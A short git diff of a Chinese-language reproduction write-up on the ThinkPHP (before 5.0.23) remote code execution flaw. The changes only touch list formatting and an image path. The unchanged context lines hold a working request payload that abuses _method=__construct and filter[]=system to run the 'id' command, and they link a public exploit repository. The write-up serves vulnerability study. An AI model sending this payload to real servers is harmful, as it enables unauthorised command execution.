@@ -6,7 +6,7 @@ ThinkPHP 是一款运用极广的 PHP 开发框架。其 5.0.23 以前的版本�
 
 参考链接：
 
-- https://github.com/top-think/framework/commit/4a4b5e64fa4c46f851b4004005bff5f3196de003
+* https://github.com/top-think/framework/commit/4a4b5e64fa4c46f851b4004005bff5f3196de003
 
 ## 环境搭建
 
@@ -38,8 +38,8 @@ _method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=id
 
 成功执行 `id` 命令：
 
-![image-20220302151553822](images/202203021515902.png)
+![image-20220302151553822](../.gitbook/assets/202203021515902.png)
 
 ## 开源 POC/EXP
 
-- https://github.com/sukabuliet/ThinkphpRCE
+* https://github.com/sukabuliet/ThinkphpRCE
